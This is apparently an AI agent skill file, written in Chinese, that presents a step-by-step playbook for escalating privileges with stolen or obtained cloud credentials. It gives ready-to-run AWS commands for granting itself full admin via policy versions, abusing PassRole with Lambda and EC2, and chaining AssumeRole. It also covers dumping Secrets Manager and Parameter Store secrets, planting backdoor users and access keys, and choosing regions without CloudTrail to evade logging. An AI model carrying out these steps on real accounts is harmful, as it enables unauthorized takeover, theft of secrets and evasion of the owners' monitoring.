---
name: cloud-iam-audit
description: "云 IAM 权限审计与提权。当获取了云平台凭据（AWS AK/SK、Azure SPN、GCP SA）需要评估权限范围和提权路径时使用。覆盖 AWS/Azure/GCP 的 IAM 策略分析、常见提权路径（PassRole、AssumeRole、Lambda 提权）、跨账号攻击、CloudTrail 规避"
metadata:
  tags: "cloud,iam,audit,privilege,escalation,aws,azure,gcp,提权,权限,凭据"
  difficulty: "hard"
  icon: "🔒"
  category: "云环境"
---

# 云 IAM 权限审计与提权方法论

在云环境中，IAM 权限就是攻击面——一个过度授权的策略比一个 RCE 漏洞更危险。

## Phase 1: 凭据识别与身份确认

### 1.1 凭据类型
| 凭据 | 格式 | 来源 |
|------|------|------|
| AWS AK/SK | `AKIA...` (20字符) | 配置文件、环境变量、元数据 |
| AWS 临时凭据 | `ASIA...` + SessionToken | IMDS、STS AssumeRole |
| Azure SPN | client_id + client_secret + tenant_id | 配置文件、Key Vault |
| GCP SA Key | JSON 文件含 `private_key` | 服务账号密钥文件 |
| 阿里云 AK/SK | `LTAI...` | 配置文件、元数据 |

### 1.2 身份确认
获取凭据后第一步——确认"我是谁"：
```bash
# AWS
aws sts get-caller-identity
# 返回: Account, UserId, Arn

# Azure
az account show
az ad signed-in-user show

# GCP
gcloud auth list
gcloud config get-value project
```

## Phase 2: 权限枚举

### AWS 权限枚举
```bash
# 列出当前用户/角色的策略
aws iam list-attached-user-policies --user-name <user>
aws iam list-attached-role-policies --role-name <role>

# 获取策略详情
aws iam get-policy-version --policy-arn <arn> --version-id v1

# 如果被拒绝——暴力枚举
# 逐个尝试 API 调用，根据 AccessDenied vs 正常响应判断权限
aws s3 ls 2>&1                    # S3 权限?
aws ec2 describe-instances 2>&1    # EC2 权限?
aws iam list-users 2>&1           # IAM 权限?
aws lambda list-functions 2>&1     # Lambda 权限?
```

### 快速权限评估矩阵
| 能做的操作 | 权限等级 | 提权可能 |
|------------|----------|----------|
| sts:GetCallerIdentity 仅此 | 只读最低 | 低 |
| s3:ListBuckets, s3:GetObject | 数据读取 | 中（可能找到更多凭据） |
| iam:List*, iam:Get* | IAM 只读 | 中（可分析提权路径） |
| iam:CreateUser/AttachPolicy | IAM 写入 | **高**（直接提权） |
| iam:PassRole + lambda/ec2:* | 间接写入 | **高**（间接提权） |
| sts:AssumeRole | 角色切换 | **高**（可能跳到更高权限角色） |

## Phase 3: 提权路径

### AWS 常见提权路径

**路径 1: iam:CreatePolicyVersion**
```bash
# 如果可以创建策略版本，直接给自己 AdministratorAccess
aws iam create-policy-version \
  --policy-arn <当前策略ARN> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**路径 2: iam:PassRole + lambda:CreateFunction**
```bash
# 创建 Lambda 函数，挂载高权限 Role → Lambda 内用 Role 权限操作
aws lambda create-function \
  --function-name pwn \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://pwn.zip
```

**路径 3: iam:PassRole + ec2:RunInstances**
```bash
# 启动 EC2 实例，挂载高权限 Instance Profile
# 然后通过 IMDS 获取该 Role 的凭据
```

**路径 4: sts:AssumeRole**
```bash
# 列出可 Assume 的 Role
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`arn:aws:iam::ACCOUNT:user/current-user`]]'

# Assume 高权限 Role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name pwn
```

**路径 5: 跨账号 AssumeRole**
```bash
# 检查 Trust Policy 中是否信任其他账号
# 如果信任 * 或宽泛的 Principal → 可从任何 AWS 账号 Assume
```

### 通用提权思路
1. **找更多凭据**：S3 桶、Secrets Manager、Parameter Store、Lambda 代码、EC2 User-Data
2. **角色链跳转**：当前 Role → AssumeRole → 更高权限 Role
3. **创建后门**：创建新用户/Access Key、修改策略、添加信任关系
4. **服务利用**：通过 Lambda/EC2/ECS 等服务间接获取 Role 权限

## Phase 4: 高价值数据搜索

确认权限后，搜索高价值数据：
```bash
# AWS Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>

# AWS Parameter Store
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# AWS S3 敏感文件
aws s3 ls s3://<bucket> --recursive | grep -iE "\.env|backup|password|credential|key|secret"
```

## Phase 5: 隐蔽性

### CloudTrail 注意事项
- 所有 API 调用都会被 CloudTrail 记录（默认管理事件，数据事件可选）
- **低噪音操作**：`sts:GetCallerIdentity`、`s3:GetObject`
- **高噪音操作**：`iam:CreateUser`、`iam:AttachPolicy`、`ec2:RunInstances`
- 某些 region 可能未开启 CloudTrail——可在该 region 操作
- GuardDuty 会检测异常 API 调用模式

## 注意事项
- 云凭据提权的核心是理解 IAM 策略——不是所有 `*` 权限都能提权，关键是**能操作 IAM 本身**
- 临时凭据有过期时间，优先使用长期 AK/SK 或创建后门 Access Key
- 跨账号攻击的价值远大于单账号提权——Trust Policy 是关键审计点
